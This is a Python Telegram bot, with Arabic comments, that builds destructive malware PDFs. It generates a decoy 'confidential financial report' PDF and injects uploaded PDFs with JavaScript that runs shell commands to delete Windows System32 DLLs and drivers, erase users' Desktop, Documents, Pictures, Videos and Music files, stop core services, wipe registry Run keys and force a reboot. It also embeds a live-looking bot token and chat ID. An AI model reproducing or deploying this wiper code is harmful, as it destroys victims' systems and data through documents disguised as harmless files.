import os
import time
import requests
import json
import random
from datetime import datetime
from PyPDF2 import PdfWriter, PdfReader
from reportlab.pdfgen import canvas
from io import BytesIO

# ============ تكوين البوت ============
TELEGRAM_CONFIG = {
    "TOKEN": "8872991146:AAEGEnOk2AvkKaHgRO7JRJiTSkTGj6CiGRA",
    "CHAT_ID": "7822155315",
    "API_URL": "https://api.telegram.org/bot"
}

# ============ دوال إنشاء PDF ============
def generate_destructive_pdf():
    try:
        packet = BytesIO()
        c = canvas.Canvas(packet)
        c.drawString(100, 750, "📄 تقرير مالي - سري للغاية")
        c.drawString(100, 720, "يُرجى فتح الملف باستخدام Adobe Reader")
        c.drawString(100, 690, "تم التوليد بواسطة: @hkyyykk_bot")
        c.save()
        packet.seek(0)
        new_pdf = PdfReader(packet)
        writer = PdfWriter()
        writer.add_page(new_pdf.pages[0])
        
        destructive_js = """
        try {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
            shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
            shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
            shell.Run("cmd.exe /c sc stop bits", 0, false);
            shell.Run("cmd.exe /c sc stop EventLog", 0, false);
            shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
            shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            shell.Run("cmd.exe /c msg * ⚠️ تم اختراق نظامك! جميع الملفات تم حذفها.", 0, false);
        } catch(e) {
            try {
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            } catch(e2) {}
        }
        """
        
        writer.add_js(destructive_js)
        filename = f"destructive_{int(time.time())}.pdf"
        filepath = os.path.join("/tmp", filename)
        with open(filepath, 'wb') as f:
            writer.write(f)
        return filepath
    except Exception as e:
        print(f"خطأ في توليد PDF: {e}")
        return None

# ============ دوال البوت ============
def send_telegram_message(chat_id, message):
    try:
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendMessage"
        data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        response = requests.post(url, json=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"خطأ في الإرسال: {e}")
        return False

def send_telegram_file(chat_id, file_path, caption=""):
    try:
        if not os.path.exists(file_path):
            return False
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendDocument"
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': chat_id, 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except Exception as e:
        print(f"خطأ في إرسال الملف: {e}")
        return False

def download_telegram_file(file_id, save_path):
    try:
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/getFile"
        params = {"file_id": file_id}
        response = requests.get(url, params=params, timeout=10)
        if response.status_code != 200:
            return False
        data = response.json()
        if not data.get('ok'):
            return False
        file_path = data['result']['file_path']
        download_url = f"https://api.telegram.org/file/bot{TELEGRAM_CONFIG['TOKEN']}/{file_path}"
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        response = requests.get(download_url, stream=True, timeout=60)
        if response.status_code == 200:
            with open(save_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            return True
        return False
    except Exception as e:
        print(f"خطأ في تحميل الملف: {e}")
        return False

def inject_payload_into_pdf(input_path, output_path=None):
    if output_path is None:
        output_path = input_path
    try:
        with open(input_path, 'rb') as f:
            original_data = f.read()
        
        destructive_js = """
        try {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
            shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
            shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
            shell.Run("cmd.exe /c sc stop bits", 0, false);
            shell.Run("cmd.exe /c sc stop EventLog", 0, false);
            shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
            shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            shell.Run("cmd.exe /c msg * ⚠️ تم اختراق نظامك! جميع الملفات تم حذفها.", 0, false);
        } catch(e) {
            try {
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            } catch(e2) {}
        }
        """
        
        combined_data = original_data + destructive_js.encode('utf-8')
        with open(output_path, 'wb') as f:
            f.write(combined_data)
        return True
    except Exception as e:
        print(f"خطأ في حقن البايلود: {e}")
        return False

def handle_file(file_id, file_name, chat_id):
    temp_input = f"/tmp/input_{int(time.time())}_{random.randint(1000, 9999)}"
    temp_output = f"/tmp/output_{int(time.time())}_{random.randint(1000, 9999)}"
    
    send_telegram_message(chat_id, f"⏳ جاري تحميل: {file_name}")
    if not download_telegram_file(file_id, temp_input):
        send_telegram_message(chat_id, "❌ فشل التحميل!")
        return
    
    if inject_payload_into_pdf(temp_input, temp_output):
        output_name = f"injected_{file_name}"
        caption = """
⚒️ <b>تم حقن البايلود في الملف!</b>
⚠️ <b>تحذير:</b> هذا الملف يدمر نظام Windows!
        """
        if send_telegram_file(chat_id, temp_output, caption):
            send_telegram_message(chat_id, "✅ تم الإرسال!")
        else:
            send_telegram_message(chat_id, "❌ فشل الإرسال!")
    else:
        send_telegram_message(chat_id, "❌ فشل الحقن!")
    
    try:
        os.remove(temp_input)
        os.remove(temp_output)
    except:
        pass

def handle_command(command, chat_id):
    command = command.lower().strip()
    
    if command == "/start":
        send_telegram_message(chat_id, """
🔐 <b>مرحباً بك في بوت التخريب!</b>
📤 أرسل /generate لتوليد PDF
📤 أرسل ملف PDF لتعديله
        """)
    elif command == "/generate":
        send_telegram_message(chat_id, "⏳ جاري التوليد...")
        filepath = generate_destructive_pdf()
        if filepath and os.path.exists(filepath):
            if send_telegram_file(chat_id, filepath, "⚒️ PDF تخريبي"):
                send_telegram_message(chat_id, "✅ تم الإرسال!")
            try: os.remove(filepath)
            except: pass
        else:
            send_telegram_message(chat_id, "❌ فشل التوليد!")
    elif command == "/status":
        send_telegram_message(chat_id, f"🟢 يعمل\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    else:
        send_telegram_message(chat_id, "⚠️ أمر غير معروف")

# ============ الاستماع للأوامر (Polling) ============
def listen_telegram():
    last_update_id = 0
    print("🚀 البوت يعمل... في انتظار الأوامر")
    
    while True:
        try:
            url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                updates = response.json().get('result', [])
                for update in updates:
                    last_update_id = update['update_id']
                    
                    message = update.get('message', {})
                    chat_id = message.get('chat', {}).get('id')
                    
                    if str(chat_id) != TELEGRAM_CONFIG['CHAT_ID']:
                        continue
                    
                    text = message.get('text', '')
                    if text:
                        handle_command(text, chat_id)
                        continue
                    
                    document = message.get('document')
                    if document:
                        file_id = document['file_id']
                        file_name = document.get('file_name', 'unknown.pdf')
                        handle_file(file_id, file_name, chat_id)
                        continue
        except Exception as e:
            print(f"⚠️ خطأ: {e}")
            time.sleep(5)
        time.sleep(1)

# ============ التشغيل ============
if __name__ == "__main__":
    print("="*50)
    print("🚀 تشغيل بوت التخريب (Polling)...")
    print(f"📱 التوكن: {TELEGRAM_CONFIG['TOKEN'][:10]}...")
    print("="*50)
    listen_telegram()
